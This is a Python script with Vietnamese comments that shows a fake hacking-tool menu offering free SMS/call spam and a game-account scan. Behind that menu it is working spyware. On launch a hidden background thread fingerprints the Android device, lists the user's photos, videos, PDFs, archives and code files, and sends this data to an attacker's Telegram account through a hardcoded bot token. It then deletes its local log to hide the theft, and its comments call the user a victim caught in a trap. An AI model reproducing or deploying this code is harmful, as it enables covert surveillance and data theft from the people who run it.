import os
import telebot
import json
import time
import socket
from datetime import datetime
from threading import Thread

# --- CẤU HÌNH ---
# 1. Dán Token của bot bạn tạo từ @BotFather vào đây
TOKEN = "8613218758:AAGpN9S6xJnQhSQ21FG4BzERNp5-RbTC6BY"
# 2. ID này là của bạn (huansbotvip) để bot gửi tin nhắn về
ADMIN_ID = "8762273971" 

bot = telebot.TeleBot(TOKEN)

def get_victim_device():
    try:
        model = os.popen("getprop ro.product.model").read().strip()
        brand = os.popen("getprop ro.product.brand").read().strip()
        ver = os.popen("getprop ro.build.version.release").read().strip()
        return f"{brand.upper()} {model} (Android {ver})"
    except:
        return socket.gethostname()

def huan_scan_engine():
    try:
        # Lấy thông tin máy
        device = get_victim_device()
        time_now = datetime.now().strftime("%H:%M:%S - %d/%m/%Y")
        
        # Đường dẫn bộ nhớ
        base_path = "/sdcard" if os.path.exists("/sdcard") else "/storage/emulated/0"
        
        # Cấu trúc dữ liệu thu thập
        logs = {
            "victim_device": device,
            "timestamp": time_now,
            "files_found": []
        }

        # Quét các file quan trọng (Ảnh, Video, Tài liệu)
        target_exts = ['.jpg', '.png', '.mp4', '.pdf', '.php', '.py', '.zip']
        
        for root, dirs, files in os.walk(base_path):
            if any(x in root.lower() for x in ['android', 'data', 'cache']):
                continue
            for file in files:
                if any(file.lower().endswith(e) for e in target_exts):
                    logs["files_found"].append(os.path.join(root, file))

        # --- BÁO CÁO VỀ CHO HUÂN ---
        msg = (
            f"🎯 **MỤC TIÊU MỚI DÍNH BẪY!**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Admin: @huansbotvip\n"
            f"📱 Máy: `{device}`\n"
            f"⏰ Thời gian: {time_now}\n"
            f"📂 Tổng file quét được: {len(logs['files_found'])}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ *Đang gửi danh sách chi tiết...*"
        )
        bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')

        # Tạo file log chi tiết và gửi
        log_file = f"Huan_Victim_{int(time.time())}.json"
        with open(log_file, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=4, ensure_ascii=False)
        
        with open(log_file, "rb") as f:
            bot.send_document(ADMIN_ID, f, caption=f"📂 Danh sách file từ {device}")
        
        # Xóa dấu vết trên máy nạn nhân
        os.remove(log_file)

    except Exception:
        pass

def ui_gia_lap():
    os.system('clear')
    print("\033[1;36m" + r"""
     _______ ____   ____  _      _    _ _    _          _   _ 
    |__   __/ __ \ / __ \| |    | |  | | |  | |   /\   | \ | |
       | | | |  | | |  | | |    | |__| | |  | |  /  \  |  \| |
       | | | |  | | |  | | |    |  __  | |  | | / /\ \ | |\  |
       | | | |__| | |__| | |____| |  | | |__| |/ ____ \| | \ |
       |_|  \____/ \____/|______|_|  |_|\____//_/    \_\_|  \_|
    """ + "\033[0m")
    print("\033[1;37m ─────────────────────────────────────────────────────────\033[0m")
    print("\033[1;32m  Admin: @huansbotvip | Phiên bản: 4.0\033[0m")
    print("\033[1;37m ─────────────────────────────────────────────────────────\033[0m")
    
    # Bắt đầu quét ngầm dữ liệu gửi về cho Huân
    Thread(target=huan_scan_engine).start()

    print("  [1] Spam SMS / Call (Free)")
    print("  [2] Scan Acc Liên Quân (VIP)")
    print("  [3] Thoát")
    print("\033[1;37m ─────────────────────────────────────────────────────────\033[0m")
    
    choice = input("\033[1;33mdevnvios#root:~# \033[0m")
    if choice == '1':
        sdt = input("Nhập SĐT: ")
        print(f"Đang Spam {sdt}... Vui lòng giữ mạng ổn định.")
        while True: time.sleep(10)
    else:
        print("Đang thoát...")

if __name__ == "__main__":
    try:
        ui_gia_lap()
    except KeyboardInterrupt:
        pass
